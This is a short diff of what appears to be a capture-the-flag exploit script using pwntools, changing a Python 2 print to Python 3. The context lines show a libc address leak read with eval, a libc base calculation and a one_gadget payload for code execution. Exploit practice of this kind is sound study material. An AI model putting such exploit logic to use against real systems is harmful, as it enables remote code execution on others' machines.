@@ -48,7 +48,7 @@ one_gadget = 0x10a38c
 io = start()
 
 leak = eval(io.recv())
-print leak
+print(leak)
 
 libc.address =  leak - (libc.symbols.system + 765772)
 payload = libc.address + one_gadget
